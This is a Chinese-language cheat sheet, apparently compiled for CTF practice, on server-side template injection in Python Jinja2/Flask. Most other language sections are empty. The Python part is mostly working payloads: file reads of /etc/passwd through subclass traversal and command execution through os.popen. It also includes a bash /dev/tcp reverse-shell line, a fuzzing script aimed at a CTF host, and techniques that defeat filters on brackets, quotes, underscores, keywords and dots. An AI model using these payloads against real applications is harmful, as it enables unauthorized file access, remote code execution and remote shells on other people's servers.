# SSTI 模板注入漏洞（Todo）

## Python

基本流程 获取基本类

```python
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] #jinjia2/flask 适用  [9]
```

获取基本类后，继续向下获取基本类(object)的子类

```
object.__subclasses__()
```
找到重载过的``__init__``类

在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的

也可以利用``.index()``去找``file``,``warnings.catch_warnings``

```python
>>> ''.__class__.__mro__[2].__subclasses__()[99].__init__
<slot wrapper '__init__' of 'object' objects>
>>> ''.__class__.__mro__[2].__subclasses__()[59].__init__
<unbound method WarningMessage.__init__>
```

查看其引用``__builtins__``

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']
```

这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file等函数来实现读取文件的功能

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```

任意文件读
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %}
```

rce
```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
```


```python
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1') %}1{% endif %}
```

```python
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

``subprocess.Popen`` fuzz脚本

```python
import requests

url = "http://38ab3221-49f0-415f-98bc-65b4744640b8.node3.buuoj.cn/"

index = 0
for i in range(100, 1000):
    #print i
    payload = "{{''.__class__.__mro__[2].__subclasses__()[%d]}}" % (i)
    params = {
        "search": payload
    }
    #print(params)
    req = requests.get(url,params=params)
    #print(req.text)
    if "subprocess.Popen" in req.text:
        index = i
        break


print("index of subprocess.Popen:" + str(index))
print("payload:{{''.__class__.__mro__[2].__subclasses__()[%d]('ls',shell=True,stdout=-1).communicate()[0].strip()}}" % i)
```

### bypass

- 绕过中括号

pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。

```
>>> ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
```
在这里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过

- 过滤引号

request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤
将其中的request.args改为request.values则利用``REQUEST``的方式进行传参

```
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
```

- 过滤双下划线

同样利用request.args属性

```
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__

```

```
GET:
{{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() }}
POST:
class=__class__&mro=__mro__&subclasses=__subclasses__
```

过滤关键字
base64编码绕过
__getattribute__使用实例访问属性时,调用该方法

例如被过滤掉__class__关键词

```
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

字符串拼接绕过

```
{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}
```
同时绕过下划线、与中括号

```
{{()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)('/etc/passwd')|attr(request.values.name5)()}}

post:
name1=__class__&name2=__base__&name3=__subclasses__&name4=pop&name5=read
```

- 绕过.过滤

若.也被过滤，使用原生JinJa2函数``|attr()``

将request.__class__改成request|attr("__class__")

参考资料 http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/#%E7%A7%91%E6%9D%A5%E6%9D%AF-easy-flask

### Flask/Jinja2

### Django

### Tornado

## Java

### JSP

### FreeMarker

### Velocity

## PHP

### Twig

### Smarty

参考资料:

https://www.jianshu.com/p/eb8d0137a7d3

### Blade

## Ruby

```
$~:is equivalent to ::last_match;

$&:contains the complete matched text;

$`:contains string before match;

$':contains string after match;

$1, $2 and so on contain text matching first, second, etc capture group;

$+:contains last capture group.
```

### ERB



## 参考资料

一篇文章带你理解漏洞之SSTI漏洞:

[https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E)


Templates Injections Payload:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

Bypass姿势：

http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/